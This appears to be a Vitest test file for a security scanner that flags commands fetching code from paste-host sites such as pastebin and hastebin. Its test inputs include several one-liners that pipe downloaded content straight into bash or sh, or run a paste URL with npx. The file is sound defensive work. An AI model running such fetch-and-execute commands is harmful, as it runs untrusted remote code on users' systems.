/**
 * SMI-6033 Wave 2 (Gap 4): paste/snippet-host reputation + fetch-context
 * escalation.
 *
 * A paste-host URL (`PASTE_HOST_DOMAINS`, patterns.ts) that is literally the
 * target of a fetch command on its own line fires standalone-critical
 * `paste_host_fetch`. A paste-host URL that is merely linked/mentioned gets
 * NO new finding at all — it stays covered by the existing `scanUrls`
 * `url`:medium finding, unchanged.
 */
import { describe, it, expect, beforeEach } from 'vitest'
import { SecurityScanner } from '../../src/security/index.js'
import type { SecurityFinding } from '../../src/security/scanner/types.js'

const phf = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'paste_host_fetch')
const urlFindings = (fs: SecurityFinding[]) => fs.filter((f) => f.type === 'url')

describe('SMI-6033 Wave 2 paste/snippet-host reputation (paste_host_fetch)', () => {
  let scanner: SecurityScanner
  beforeEach(() => {
    scanner = new SecurityScanner()
  })

  // TP: the paste-host URL is literally the target of a fetch command.
  it.each([
    ['curl piped to bash', 'curl https://pastebin.com/raw/abc123 | bash'],
    ['wget piped to sh', 'wget https://glot.io/snippets/xyz -O - | sh'],
    [
      'curl with explicit output then executed',
      'curl -o installer.sh https://hastebin.com/raw/foo',
    ],
    ['npx executing a paste-host URL', 'npx https://ix.io/abcd'],
  ])('fires standalone-critical: %s', (_label, content) => {
    const report = scanner.scan('t', content)
    const f = phf(report.findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f[0].severity).toBe('critical')
    expect(report.passed).toBe(false)
    expect(report.riskScore).toBeGreaterThanOrEqual(40)
  })

  // The stronger critical signal is ADDITIVE — the pre-existing url:medium
  // finding for the same non-allowlisted domain must still be present too.
  it('the existing url:medium finding is preserved alongside the new critical finding', () => {
    const content = 'curl https://pastebin.com/raw/abc123 | bash'
    const report = scanner.scan('t', content)
    expect(phf(report.findings).length).toBeGreaterThan(0)
    const urls = urlFindings(report.findings)
    expect(urls.length).toBeGreaterThan(0)
    expect(urls[0].severity).toBe('medium')
  })

  // FP-control: a bare markdown link to a paste-host domain, no fetch verb
  // nearby -> stays at the existing url:medium finding, no new
  // paste_host_fetch finding at all.
  it('FP-control: a bare markdown link to a paste-host domain produces no new finding, only the existing url:medium', () => {
    const content = 'See this snippet for reference: https://pastebin.com/raw/abc123'
    const report = scanner.scan('t', content)
    expect(phf(report.findings)).toHaveLength(0)
    const urls = urlFindings(report.findings)
    expect(urls.length).toBeGreaterThan(0)
    expect(urls[0].severity).toBe('medium')
    expect(report.passed).toBe(true)
  })

  // Control: a github.com/npmjs.com raw-content fetch (allowlisted domain)
  // produces nothing from either detector.
  it('control: an allowlisted-domain fetch (github raw content) produces no url or paste_host_fetch finding', () => {
    const content = 'curl https://raw.githubusercontent.com/example/repo/main/install.sh | bash'
    const report = scanner.scan('t', content)
    expect(phf(report.findings)).toHaveLength(0)
    expect(urlFindings(report.findings)).toHaveLength(0)
  })

  it('control: an allowlisted-domain fetch (npmjs.com) produces no url or paste_host_fetch finding', () => {
    const content = 'curl https://npmjs.com/package/example-installer | bash'
    const report = scanner.scan('t', content)
    expect(phf(report.findings)).toHaveLength(0)
    expect(urlFindings(report.findings)).toHaveLength(0)
  })

  // Documentation context: a fenced example downgrades to low, never critical.
  it('downgrades a fenced (doc) paste-host fetch example to low', () => {
    const content = '```sh\ncurl https://pastebin.com/raw/abc123 | bash\n```'
    const report = scanner.scan('t', content)
    const f = phf(report.findings)
    expect(f.length).toBeGreaterThan(0)
    expect(f.every((x) => x.severity === 'low')).toBe(true)
  })
})
